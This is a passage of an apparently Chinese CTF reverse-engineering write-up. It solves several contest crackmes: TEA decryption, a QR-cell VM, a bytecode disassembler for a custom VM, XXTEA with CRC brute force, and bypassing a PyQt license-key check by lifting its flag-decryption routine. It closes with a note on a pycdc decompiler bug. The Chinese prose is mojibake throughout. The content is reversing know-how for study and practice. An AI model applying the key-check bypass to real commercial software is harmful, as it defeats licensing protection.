v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); v1 += ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } å¯¹æ¯”ä¸€ä¸‹ï¼Œzæ˜¯v[1]ï¼Œxæ˜¯sumï¼Œyæ˜¯v[0]ï¼Œæˆ–è€…çœ‹ä¸‹é¢è¿™æ®µ\nfor __g[\u0026#39;x\u0026#39;] in [c_uint32(0)] ][0] for __g[\u0026#39;z\u0026#39;] in [c_uint32(v[1])] ][0] for __g[\u0026#39;y\u0026#39;] in [c_uint32(v[0])] deltaå¸¸æ•°\nfor __g[\u0026#39;u\u0026#39;] in [2654435769] å¯†é’¥å¸¸æ•°\nfor __g[\u0026#39;k\u0026#39;] in [[3735928559, 590558003, 19088743, 4275878552]] åˆ°é¢˜ç›®æè¿°é‡Œæ‰¾åˆ°å¯†æ–‡ f1f5d29b6e4414ecï¼ˆè¿™è¿˜å¾—è‡ªå·±å»githubæ‰¾ï¼Œç¦»è°±ï¼‰\nè§£å¯†\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; //åŠ å¯†å‡½æ•° void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u0026lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); v1 += ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } //è§£å¯†å‡½æ•° void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i\u0026lt;32; i++) { /* basic cycle start */ v1 -= ((v0\u0026lt;\u0026lt;4) + k2) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k3); v0 -= ((v1\u0026lt;\u0026lt;4) + k0) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } int main() { uint32_t v[2]={0xf1f5d29b, 0x6e4414ec},k[4]={3735928559, 590558003, 19088743, 4275878552}; // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ // printf(\u0026#34;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); // encrypt(v, k); // printf(\u0026#34;åŠ å¯†åçš„æ•°æ®ï¼š%u %u\\n\u0026#34;,v[0],v[1]); decrypt(v, k); printf(\u0026#34;è§£å¯†åçš„æ•°æ®ï¼š%x %x\\n\u0026#34;,v[0],v[1]); return 0; } [FBCTF]go_get_the_flag æ²¡æƒ³åˆ°èƒ½åœ¨ç¬¬äº”é¡µè§åˆ°memequalçš„é¢˜ï¼ŒçœŸæ­£çš„baby\n[Zer0pts2020]QR Puzzle QRæ–‡ä»¶æ˜¯25*25çš„å­—ç¬¦ä¸²ï¼Œæ¯ä¸€ä½éƒ½æ˜¯å­—ç¬¦0æˆ–1\nkeyæ–‡ä»¶æ¯ä¸€è¡Œæ ¼å¼ä¸º a#(b,c)ï¼Œæœ€åå­˜å‚¨åˆ°é“¾è¡¨ä¸­ï¼Œæœ«å°¾åœ¨å‰ï¼Œå…·ä½“ç»“æ„ä¸º int b, int c, int a, 0, *next\nä»åŠ å¯†å‡½æ•°æ¥çœ‹ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªvm\nç®€å•æ•´ç†ä¸€ä¸‹\nvoid __fastcall sub_400BD0(__int64 a1, int *a2) { int v2; // er8 int v3; // edx _QWORD *v4; // r9 _QWORD *v5; // rcx int v6; // er9 __int64 v7; // rax __int64 v8; // rcx while ( a2 ) { x = a2[2]; y = a2[0]; z = a2[1]; if ( x == 1 ) { v2 = z; v3 = y + 1; goto LABEL_4; } if ( x == 0 ) { v2 = z; v3 = y - 1; goto LABEL_4; } if ( x == 3 ) { v2 = z + 1; v3 = y; goto LABEL_4; } if ( x == 2 ) { v2 = z - 1; v3 = y; } LABEL_4: v4 = \u0026amp;a1[z]; v5 = \u0026amp;a1[v2]; *(_BYTE *)(v7 + *v4) += *(_BYTE *)(*v5 + v3); *(_BYTE *)(v3 + *v5) = *(_BYTE *)(*v4 + v7) - *(_BYTE *)(v3 + *v5); *(_BYTE *)(*v4 + v7) -= *(_BYTE *)(*v5 + v3); // ç»å…¸swap a2 = (int *)*((_QWORD *)a2 + 2); // a2 = a2-\u0026gt;next } } æ˜¾ç„¶åŠ å¯†å°±æ˜¯å’Œå‘¨å›´æŸä¸ªä½ç½®äº¤æ¢ä¸€ä¸‹\nè§£å¯†å’ŒåŠ å¯†æ˜¯å¯¹ç§°çš„ï¼Œç›´æ¥æŠŠkeyæ–‡ä»¶åè½¬è¿‡æ¥ï¼Œå°±æ˜¯è§£å¯†äº†\næ¥ä¸‹æ¥éœ€è¦æŠŠ01ä¸²å˜æˆå›¾ç‰‡\nfrom PIL import Image def black_block(image, x, y): for i in range(5): for j in range(5): image.putpixel((x + i, y + j), (0, 0, 0)) im = Image.new(\u0026#39;RGB\u0026#39;, (125, 125), \u0026#34;#FFFFFF\u0026#34;) flag = [ \u0026#39;1111111001000101001111111\u0026#39;, \u0026#39;1000001011001001001000001\u0026#39;, \u0026#39;1011101001110011101011101\u0026#39;, \u0026#39;1011101001100010101011101\u0026#39;, \u0026#39;1011101011000111001011101\u0026#39;, \u0026#39;1000001001110111101000001\u0026#39;, \u0026#39;1111111010101010101111111\u0026#39;, \u0026#39;0000000000101101100000000\u0026#39;, \u0026#39;1010101000001110000010010\u0026#39;, \u0026#39;0011100010000110101001001\u0026#39;, \u0026#39;1001001100011110111010011\u0026#39;, \u0026#39;1110110110001111000101000\u0026#39;, \u0026#39;0101001011011100011101011\u0026#39;, \u0026#39;0101100101111010101001011\u0026#39;, \u0026#39;1001011011011000000100111\u0026#39;, \u0026#39;0101010010001110011110011\u0026#39;, \u0026#39;1001101001110010111111000\u0026#39;, \u0026#39;0000000011110000100011001\u0026#39;, \u0026#39;1111111001100101101010111\u0026#39;, \u0026#39;1000001001010001100010000\u0026#39;, \u0026#39;1011101011101000111111011\u0026#39;, \u0026#39;1011101000111101000010000\u0026#39;, \u0026#39;1011101010111011010110101\u0026#39;, \u0026#39;1000001001001111111010010\u0026#39;, \u0026#39;1111111011110011100011011\u0026#39; ] for i in range(len(flag)): for j in range(len(flag[0])): if flag[i][j] == \u0026#39;1\u0026#39;: black_block(im, i * 5, j * 5) im.show() æ‰«æäºŒç»´ç æ‹¿flag\n[XMAN2018æ’ä½èµ›]easyvm vmé¢˜ï¼Œä¸Šæ¥å…ˆæŠŠå­—èŠ‚ç¿»è¯‘æˆæ±‡ç¼–æ ¼å¼\nvm_code = [ 0x05, 0x01, 0x0B, 0x13, 0x03, 0x03, 0x13, 0x00, 0x00, 0x13, 0x04, 0x04, 0x28, 0x0C, 0x00, 0x33, 0x14, 0x00, 0x20, 0x05, 0x09, 0x01, 0x11, 0x09, 0x00, 0x0B, 0x0A, 0x09, 0x01, 0x04, 0x0A, 0x1B, 0x05, 0x04, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x20, 0x28, 0x13, 0x00, 0x00, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xE0, 0x07, 0x02, 0x08, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0xE0, 0x1E, 0x00, 0x05, 0x01, 0x04, 0x00, 0x13, 0x03, 0x03, 0x28, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0x1F, 0x20, 0x00, 0x03, 0x1B, 0x05, 0x00, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xE0, 0x07, 0x02, 0x08, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0xE0, 0x1E, 0x00, 0x05, 0x1D, 0x05, 0x0A, 0x0D, 0x0A, 0x00, 0x1B, 0x05, 0x0A, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x1F, 0x28, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x18, 0x00, 0x1F, 0x20, 0x00, 0x03, 0x0D, 0x00, 0x04, 0x1B, 0x05, 0x00, 0x13, 0x03, 0x03, 0x03, 0x04, 0x0D, 0x28, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xE0, 0x07, 0x02, 0x08, 0x09, 0x0A, 0x02, 0x01, 0x00, 0x0A, 0x1B, 0x05, 0x00, 0x01, 0x00, 0x04, 0x0D, 0x00, 0x03, 0x1D, 0x05, 0x0A, 0x13, 0x0A, 0x00, 0x1B, 0x05, 0x0A, 0x22, 0x04, 0x08, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x20, 0x28, 0x13, 0x03, 0x03, 0x13, 0x04, 0x04, 0x05, 0x01, 0x0C, 0x28, 0x05, 0x09, 0x01, 0x11, 0x09, 0x03, 0x0B, 0x0A, 0x09, 0x01, 0x00, 0x0A, 0x1B, 0x05, 0x00, 0x07, 0x08, 0x05, 0x0E, 0x08, 0xDF, 0x09, 0x0A, 0x08, 0x1D, 0x05, 0x00, 0x1B, 0x05, 0x00, 0x27, 0x00, 0x0A, 0x17, 0x04, 0x07, 0x0C, 0x03, 0x01, 0x24, 0x03, 0x20, 0x28, 0x2A, 0x00, 0x00 ] index = 0 length = len(vm_code) inloop = 0 while index \u0026lt; length: v22 = vm_code[index] v6 = vm_code[index + 1] v5 = vm_code[index + 2] v21 = vm_code[index] \u0026amp; 0xFE v20 = vm_code[index] \u0026amp; 1 if v21 == 0: if v20 == 1: print (f\u0026#39;_{index}: mov v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: mov v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 2: if v20 == 1: print (f\u0026#39;_{index}: mov32 v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: mov32 v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 4: if v20 == 1: print (f\u0026#39;_{index}: lea_ch v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 6: if v20 == 1: print (f\u0026#39;_{index}: lea_int v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 8: if v20 == 1: print (f\u0026#39;_{index}: ldr_int v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 0xA: if v20 == 1: print (f\u0026#39;_{index}: ldr_ch v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 0xC: if v20 == 1: print (f\u0026#39;_{index}: add v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: add v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0xE: if v20 == 1: print (f\u0026#39;_{index}: add_pint v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: add_pint v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x10: if v20 == 1: print (f\u0026#39;_{index}: add_pch v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: add_pch v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x12: if v20 == 1: print (f\u0026#39;_{index}: my_xor v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: my_xor v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x14: if v20 == 0: print (f\u0026#39;_{index}: mod v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x16: if v20 == 1: print (f\u0026#39;_{index}: my_or v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: my_or v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x18: if v20 == 1: print (f\u0026#39;_{index}: my_and v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: my_and v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x1A: if v20 == 1: print (f\u0026#39;_{index}: push v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: push v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x1C: if v20 == 1: print (f\u0026#39;_{index}: pop v23[{v6}], v23[{v5}]\u0026#39;) index += 2 elif v21 == 0x1E: if v20 == 1: print (f\u0026#39;_{index}: shr v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: shr v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x20: if v20 == 1: print (f\u0026#39;_{index}: shl v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: shl v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x22: if v20 == 1: print (f\u0026#39;_{index}: ror v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: ror v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x24: if v20 == 1: print (f\u0026#39;_{index}: cmpl v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: cmpl v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x26: if v20 == 1: print (f\u0026#39;_{index}: cmpeq v23[{v6}], v23[{v5}]\u0026#39;) if v20 == 0: print (f\u0026#39;_{index}: cmpeq v23[{v6}], {v5}\u0026#39;) index += 2 elif v21 == 0x28: if inloop == 0: print (f\u0026#39;\\n_{index}: start_loop\u0026#39;) inloop = 1 elif inloop == 1: print (f\u0026#39;_{index}: end_loop\\n\u0026#39;) inloop = 0 elif v21 == 0x2A: print (f\u0026#39;_{index}: judge\u0026#39;) break index += 1 è½¬æ¢ç»“æœ\n_0: lea_ch v23[1], v23[11] _3: my_xor v23[3], v23[3] _6: my_xor v23[0], v23[0] _9: my_xor v23[4], v23[4] _12: start_loop _13: add v23[0], 51 _16: mod v23[0], 32 _19: lea_ch v23[9], v23[1] _22: add_pch v23[9], v23[0] _25: ldr_ch v23[10], v23[9] _28: mov v23[4], v23[10] _31: push v23[5], v23[4] _34: add v23[3], 1 _37: cmpl v23[3], 32 _40: end_loop _41: my_xor v23[0], v23[0] _44: lea_int v23[8], v23[5] _47: add_pint v23[8], 224 _50: lea_int v23[2], v23[8] _53: ldr_int v23[10], v23[2] _56: mov v23[0], v23[10] _59: my_and v23[0], 224 _62: shr v23[0], 5 _65: mov v23[4], v23[0] _68: my_xor v23[3], v23[3] _71: start_loop _72: ldr_int v23[10], v23[2] _75: mov v23[0], v23[10] _78: my_and v23[0], 31 _81: shl v23[0], 3 _84: push v23[5], v23[0] _87: lea_int v23[8], v23[5] _90: add_pint v23[8], 224 _93: lea_int v23[2], v23[8] _96: ldr_int v23[10], v23[2] _99: mov v23[0], v23[10] _102: my_and v23[0], 224 _105: shr v23[0], 5 _108: pop v23[5], v23[10] _111: add v23[10], v23[0] _114: push v23[5], v23[10] _117: add v23[3], 1 _120: cmpl v23[3], 31 _123: end_loop _124: ldr_int v23[10], v23[2] _127: mov v23[0], v23[10] _130: my_and v23[0], 31 _133: shl v23[0], 3 _136: add v23[0], v23[4] _139: push v23[5], v23[0] _142: my_xor v23[3], v23[3] _145: mov32 v23[4], v23[13] _148: start_loop _149: lea_int v23[8], v23[5] _152: add_pint v23[8], 224 _155: lea_int v23[2], v23[8] _158: ldr_int v23[10], v23[2] _161: mov v23[0], v23[10] _164: push v23[5], v23[0] _167: mov v23[0], v23[4] _170: add v23[0], v23[3] _173: pop v23[5], v23[10] _176: my_xor v23[10], v23[0] _179: push v23[5], v23[10] _182: ror v23[4], 8 _185: add v23[3], 1 _188: cmpl v23[3], 32 _191: end_loop _192: my_xor v23[3], v23[3] _195: my_xor v23[4], v23[4] _198: lea_ch v23[1], v23[12] _201: start_loop _202: lea_ch v23[9], v23[1] _205: add_pch v23[9], v23[3] _208: ldr_ch v23[10], v23[9] _211: mov v23[0], v23[10] _214: push v23[5], v23[0] _217: lea_int v23[8], v23[5] _220: add_pint v23[8], 223 _223: ldr_int v23[10], v23[8] _226: pop v23[5], v23[0] _229: push v23[5], v23[0] _232: cmpeq v23[0], v23[10] _235: my_or v23[4], v23[7] _238: add v23[3], 1 _241: cmpl v23[3], 32 _244: end_loop _245: judge å› ä¸ºæ˜¯Mach-Oæ–‡ä»¶ï¼Œä¸ä¼šåŠ¨è°ƒï¼Œåªèƒ½çœ‹é™æ€äº†ï¼ˆæˆåŠŸè¢«æŒ‡é’ˆæ¶å¿ƒåˆ°äº†ï¼Œç®—æ³•å…¨é çŒœï¼‰\nç¬¬ä¸€ä¸ªå¾ªç¯å°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªé¡ºåºä¸Šçš„è½¬æ¢ï¼ˆç±»ä¼¼æ …æ å§ï¼‰\nç¬¬äºŒä¸ªå¾ªç¯çœ‹åˆ°æœ‰å…ˆå³ç§»5bitï¼Œå†å·¦ç§»3bitï¼Œä¸€å¼€å§‹çŒœæµ‹å¯èƒ½æ˜¯å­—èŠ‚å†…éƒ¨è½¬æ¢ï¼Œåæ¥å‘ç°åœ¨å¾ªç¯çš„å‰ä¹Ÿæœ‰ä¸ªå³ç§»ï¼Œå¾ªç¯åä¹Ÿæœ‰ä¸ªå·¦ç§»ï¼Œä»£ç å‡ ä¹éƒ½ä¸€æ ·ï¼ŒçŒœæµ‹æ˜¯æ‰€æœ‰å­—èŠ‚ä¸€èµ·è¿›è¡Œä½ç§»\nç¬¬ä¸‰ä¸ªå¾ªç¯æ³¨æ„åˆ°æœ‰ä¸ª ror çš„å¾ªç¯å³ç§»ï¼Œç„¶åè¿˜æœ‰å¼‚æˆ–ï¼Œå°±æ˜¯æ¯æ¬¡å¼‚æˆ–ä¸€ä¸ªå­—èŠ‚\næœ€åå†™ä¸€ä¸ªè§£å¯†ï¼Œä»æ–‡ä»¶é‡Œdumpå‡ºå¯†æ–‡å’Œkey\ncipher = [ 0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF ] key = [0xDE, 0xAD, 0xBE, 0xEF] s = 0 for i in range(32): cipher[i] ^= key[i % 4] + i cipher[i] \u0026amp;= 0xFF s \u0026lt;\u0026lt;= 8 s += cipher[i] s \u0026lt;\u0026lt;= 5 s += (s \u0026gt;\u0026gt; (len(bin(s)[2:]) - 5)) s \u0026amp;= ((1 \u0026lt;\u0026lt; (32 * 8)) - 1) from libnum import * i = 35 flag = [0 for _ in range(32)] for _ in range(32): i += -5 i %= 32 print (chr(n2s(s)[i]), end = \u0026#39;\u0026#39;) print () VMé¢˜çœŸæ˜¯ä½“åŠ›æ´»\n[RCTF2019]babyre1 è¿™é¢˜å…¶å®å‡ºçš„æŒºå¥½ï¼Œå°±æ˜¯flagçš„æ ¡éªŒå·®ä¸€å­—èŠ‚æ²¡å†™å¥½ï¼Œå¯æƒœäº†\nå…ˆè¦è¾“å…¥flagï¼Œå¹¶é•¿åº¦ä¸èƒ½è¶…è¿‡ 0x10\n__printf_chk(1LL, \u0026#34;Input right flag you can got \u0026#39;Bingo!\u0026#39; :\u0026#34;); __isoc99_scanf(\u0026#34;%31s\u0026#34;, v11); v3 = \u0026amp;v11[strlen(v11)]; if ( (unsigned __int64)(v3 - v11) \u0026gt; 0x10 ) { puts(\u0026#34;input is too long!\u0026#34;); } ç„¶ååœ¨elseé‡Œè¿›è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œå°†16ä½è¾“å…¥ï¼ˆæŒ‰ç…§åå…­è¿›åˆ¶ï¼‰å‹ç¼©æˆäº†8ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œè¿˜æ²¡æœ‰è¦æ±‚å¤§å°å†™\nä¸­é—´ç»è¿‡çš„åŠ è§£å¯†å‡½æ•°å…ˆç•¥è¿‡ï¼Œåé¢çš„éªŒè¯æ˜¯éœ€è¦è¾“å‡ºä¸€ä¸ª Bingo!ï¼Œè¦æ±‚CRC16çš„æ ¡éªŒç»“æœä¸º0x69E2ï¼Œç„¶åå°±ä¼šå¯¹è¿ç®—ç»“æœå†å¼‚æˆ– 0x17 å¹¶è¾“å‡ºï¼Œç¨‹åºå¦‚ä¸‹\nif ( v4 \u0026amp;\u0026amp; (v5 = sub_180(ptr, v4, \u0026amp;key_202010, 16, \u0026amp;a5), (v6 = v5) != 0LL) \u0026amp;\u0026amp; a5 \u0026gt; 0 \u0026amp;\u0026amp; CRC16_3D0(v5, a5) == 0x69E2 ) { for ( i = 0LL; a5 \u0026gt; (int)i; ++i ) v6[i] ^= 0x17u; puts(v6); if ( ptr ) free(ptr); free(v6); } åœ¨çŸ¥é“è¿ç®—ç»“æœåï¼Œçœ‹ä¸€ä¸‹ä¸­é—´çš„è¿ç®—ï¼Œæ ¸å¿ƒé€»è¾‘ä¸º\nxxtea_CE0((int *)v8, -(v10 \u0026gt;\u0026gt; 2), a3); v11 = v8[a2 - 1]; v8[a2] = 0; *a5 = a2; if ( a2 \u0026gt; v11 \u0026amp;\u0026amp; v11 \u0026lt;= 4 ) { v13 = a2 - v11; *a5 = v13; v8[v13] = 0; return (char *)v8; } å°±æ˜¯ä¸€ä¸ªxxteaçš„ç¨‹åºï¼ˆå…¶ä¸­åŒ…æ‹¬äº†åŠ å¯†å’Œè§£å¯†ï¼Œç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œå°±ä¸å±•ç¤ºäº†ï¼‰ï¼Œç„¶åæ˜¯æ ¹æ®æœ€åä¸€ä¸ªå­—èŠ‚è¿›è¡Œå­—ç¬¦ä¸²çš„æˆªæ–­\nçˆ†ç ´äº†ä¸€ä¸‹CRCï¼Œå‘ç°å‰å…­ä¸ªå­—èŠ‚æ­£å¥½æ»¡è¶³ï¼Œäºæ˜¯ä¸çŸ¥é“å’‹åŠäº†ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°åæ¥å‡ºé¢˜äººæä¾›äº†ä¸€ä¸ªmd5ï¼Œé‚£å°±å†™ä¸ªè§£å¯†ç¨‹åºç„¶åçˆ†ç ´å°±è¡Œäº†\n[INSHack2017]proprietary-cctv-software è¿™é¢˜ç”¨uncompyle6èƒ½è¿˜åŸå‡ºæ¥æºç ï¼Œæ˜¯ä¸€ä¸ªPyQtçš„ä»£ç ï¼Œè¾“å…¥éªŒè¯éƒ¨åˆ†ä¸º\ndef btn_ok_clicked(self): s = \u0026#39;\u0026#39; for le in self.le_parts: s += le.text() s += \u0026#39;-\u0026#39; s = s[:-1] if self.activator.activate(s.upper()): self.c.ok.emit() else: self.c.ko.emit() self.close() ä»¥åŠ\nclass Activator(object): CHARSET = \u0026#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; def __init__(self): super(Activator, self).__init__() self.z = 36 self.checksum = [30, 24, 18, 12, 6, 0] def block(self, b, mod): print_dbg(\u0026#39;call: block(self, b=\u0026lt;%s\u0026gt;, mod=%d)\u0026#39; % (b, mod)) if len(b) != 6: print_dbg(\u0026#39;err: incorrect block length (%d)\u0026#39; % len(b)) return s = 0 for k in range(0, len(b)): l = b[k] if l not in Activator.CHARSET: print_dbg(\u0026#39;err: input not found in charset (%s)\u0026#39; % l) return v = abs(Activator.CHARSET.index(l) - (k + 1)) s += v print_dbg(\u0026#39;current l is: %s\u0026#39; % l) print_dbg(\u0026#39;current k is: %d\u0026#39; % k) print_dbg(\u0026#39;current value is: %d\u0026#39; % v) print_dbg(\u0026#39;current sum is: %d\u0026#39; % s) return s % mod def activate(self, s): print_dbg(\u0026#39;call: activate(self, s=\u0026lt;%s\u0026gt;)\u0026#39; % s) blocks = s.split(\u0026#39;-\u0026#39;) blocks_sz = len(blocks) if blocks_sz != 6: print_dbg(\u0026#39;err: incorrect number of blocks (%d)\u0026#39; % blocks_sz) return False for k in range(0, blocks_sz): self.z = self.block(blocks[k], self.z) print_dbg(\u0026#39;dbg: new z is: %d\u0026#39; % self.z) if self.z is None: print_dbg(\u0026#39;err: block function returned error\u0026#39;) return False if self.z != self.checksum[k]: print_dbg(\u0026#39;err: incorrect checksum (z=%d tested against checksum[%d]=%d)\u0026#39; % (self.z, k, self.checksum[k])) return False return True ä¸€ä¸ªæ–¹æ³•æ˜¯é€†å‘è¿™ä¸€éƒ¨åˆ†ï¼Œç„¶åè¿è¡Œç¨‹åºï¼Œåº”è¯¥å°±èƒ½æ‹¿åˆ°flag\nä½†æ‡’å¾—é…ç¯å¢ƒäº†ï¼Œæ‰€ä»¥åˆæ‰¾äº†ä¸€ä¸‹flagç”Ÿæˆå‡½æ•°\nclass ActivatedWidget(QWidget): __doc__ = \u0026#39;docstring for ActivatedWidget\u0026#39; def __init__(self): super(ActivatedWidget, self).__init__() self.lab_result = None self.yek = [ 5, 202, 234, 95, 76, 173, 96, 10, 232, 7, 146, 79, 111, 147, 145, 13] self.vei = [ 175, 161, 61, 70, 144, 218, 0, 50, 73, 173, 240, 202, 184, 17, 148, 2] self.cne = [ 253, 14, 187, 117, 252, 19, 15, 86, 196, 138, 67, 165, 142, 237, 112, 47, 154, 189, 33, 75, 195, 205, 10, 56, 3, 230, 180, 147, 134, 27, 143, 15, 250, 19, 235, 96, 231, 5, 74, 83, 136, 149, 79, 170, 136, 252, 113, 112, 223, 248, 33, 119, 206, 218, 79, 121, 9, 225, 253, 156, 136, 26, 146, 93, 188, 94, 170, 79, 184, 87, 102, 61, 178, 167, 20, 231, 132, 253, 106, 38, 141, 224, 112, 98, 171, 153, 50, 89, 5, 194, 181, 247, 137, 23, 139, 31, 251, 89, 169, 89, 198, 127, 97, 10, 170, 246, 105, 197, 226, 128, 30, 22] self.init_ui() def finalize(self): clear = \u0026#39;\u0026#39; buf = self.cne key = self.yek iv = self.vei buf_sz = len(buf) bsize = 16 for i in range(0, int(buf_sz / bsize)): for j in range(0, bsize): c = buf[(i * bsize + j)] ^ key[j] ^ iv[j] iv[j] = buf[(i * bsize + j)] buf[i * bsize + j] = c i = buf[(buf_sz - 1)] for j in range(0, i): buf[buf_sz - 1 - j] = 0 for i in range(0, buf_sz): if buf[i] == 0: break clear += chr(buf[i]) return clear æ‰‹åŠ¨å°†è¿™ä¸€æ®µæå–å‡ºæ¥ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹ï¼Œå°† return æ”¹æˆ print ï¼Œä¹Ÿèƒ½æ‹¿åˆ°flag\nç®€è¦è®°å½•pycdcçš„bug ROT_TWOæŒ‡ä»¤æœªæˆåŠŸè¿˜åŸ å¥½åƒæ˜¯è“å¸½æ¯å†³èµ›çš„æ—¶å€™é‡åˆ°çš„é—®é¢˜å§ï¼Ÿå½“æ—¶ç”¨pycdasæ‰‹åŠ¨è§£çš„ï¼Œåæ¥ä¿®æ”¹äº†ä¸€ä¸‹pycæ–‡ä»¶å‰å‡ ä¸ªå­—èŠ‚çš„æ··æ·†ï¼Œç”¨pycdcè·‘å®Œåå‘ç°çš„é—®é¢˜ï¼ˆå¯èƒ½æ˜¯æ··æ·†æ²¡å»å¹²å‡€ï¼Œåªè¿˜åŸå‡ºäº†å‰ä¸‰ä¸ªå‡½æ•°ï¼Œä¸è¿‡æ­£å¥½å‘ç°äº†è¿™ä¸ªbugï¼‰\næ‰‹åŠ¨è¿˜åŸçš„ä¸ºï¼š\ndef gen_prime(n_bits): res = gen_num(n_bits) while not g.is_prime(res): b = 1 while b != 0: res, b = res ^ b, (res \u0026amp; b) \u0026lt;\u0026lt; 1 return res ç„¶åç”¨pycdcè¿˜åŸçš„ä¸ºï¼š\ndef gen_prime(n_bits): res = gen_num(n_bits) while not g.is_prime(res): b = 1 while b != 0: res = res ^ b b = (res \u0026amp; b) \u0026lt;\u0026lt; 1 return res é™„ä¸Špycdasç»“æœ\n[Code] File Name: /somewhere/encrypt.py Object Name: gen_prime Arg Count: 1 KW Only Arg Count: 0 Locals: 3 Stack Size: 3 Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE) [Names] \u0026#39;gen_num\u0026#39; \u0026#39;g\u0026#39; \u0026#39;is_prime\u0026#39; [Var Names] \u0026#39;n_bits\u0026#39; \u0026#39;res\u0026#39; \u0026#39;b\u0026#39; [Free Vars] [Cell Vars] [Constants] None 1 0 [Disassembly] 0 LOAD_GLOBAL 0: gen_num 2 LOAD_FAST 0: n_bits 4 CALL_FUNCTION 1 6 